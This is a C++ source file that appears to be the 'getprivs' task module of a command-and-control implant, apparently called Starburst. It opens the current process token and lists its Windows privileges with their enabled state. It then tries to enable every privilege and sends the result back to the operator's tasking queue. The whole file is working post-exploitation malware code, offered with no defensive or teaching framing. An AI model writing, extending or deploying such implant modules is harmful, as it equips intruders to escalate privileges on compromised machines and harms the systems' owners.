#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_GETPRIVS

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_getprivs(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    HANDLE h_token = nullptr;
    HANDLE h_proc = reinterpret_cast<HANDLE>( static_cast<intptr_t>( -1 ) );

    if ( !inst.advapi32.OpenProcessToken( h_proc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h_token ) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "OpenProcessToken failed" ) ) );
        return;
    }

    DWORD needed = 0;
    inst.advapi32.GetTokenInformation( h_token, TokenPrivileges, nullptr, 0, &needed );
    if ( needed == 0 ) {
        inst.kernel32.CloseHandle( h_token );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetTokenInformation failed" ) ) );
        return;
    }

    auto tp = static_cast<TOKEN_PRIVILEGES*>( inst.heap_alloc( needed ) );
    if ( !tp ) {
        inst.kernel32.CloseHandle( h_token );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    if ( !inst.advapi32.GetTokenInformation( h_token, TokenPrivileges, tp, needed, &needed ) ) {
        inst.heap_free( tp );
        inst.kernel32.CloseHandle( h_token );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetTokenInformation failed" ) ) );
        return;
    }

    uint32_t out_cap = 8192;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        inst.heap_free( tp );
        inst.kernel32.CloseHandle( h_token );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    uint32_t off = 0;

    for ( DWORD i = 0; i < tp->PrivilegeCount && off + 128 < out_cap; i++ ) {
        wchar_t priv_name_w[64] = { 0 };
        DWORD name_len = 64;
        if ( !inst.advapi32.LookupPrivilegeNameW( nullptr, &tp->Privileges[i].Luid, priv_name_w, &name_len ) )
            continue;

        char priv_name[64] = { 0 };
        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, priv_name_w, -1, priv_name, 64, nullptr, nullptr );

        uint32_t nlen = str_len( priv_name );
        memory::copy( output + off, priv_name, nlen );
        off += nlen;

        // pad for alignment
        for ( uint32_t pad = nlen; pad < 40; pad++ ) output[off++] = ' ';

        DWORD attrs = tp->Privileges[i].Attributes;
        if ( attrs & SE_PRIVILEGE_ENABLED_BY_DEFAULT ) {
            str_copy( output + off, symbol<char*>( const_cast<char*>( "Enabled (Default)" ) ) );
            off += 17;
        } else if ( attrs & SE_PRIVILEGE_ENABLED ) {
            str_copy( output + off, symbol<char*>( const_cast<char*>( "Enabled" ) ) );
            off += 7;
        } else {
            str_copy( output + off, symbol<char*>( const_cast<char*>( "Disabled" ) ) );
            off += 8;
        }

        output[off++] = '\n';
    }

    // try to enable all privileges
    for ( DWORD i = 0; i < tp->PrivilegeCount; i++ ) {
        TOKEN_PRIVILEGES tp_single = {};
        tp_single.PrivilegeCount = 1;
        tp_single.Privileges[0].Luid = tp->Privileges[i].Luid;
        tp_single.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        inst.advapi32.AdjustTokenPrivileges( h_token, FALSE, &tp_single, sizeof(tp_single), nullptr, nullptr );
    }

    output[off] = '\0';
    inst.heap_free( tp );
    inst.kernel32.CloseHandle( h_token );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
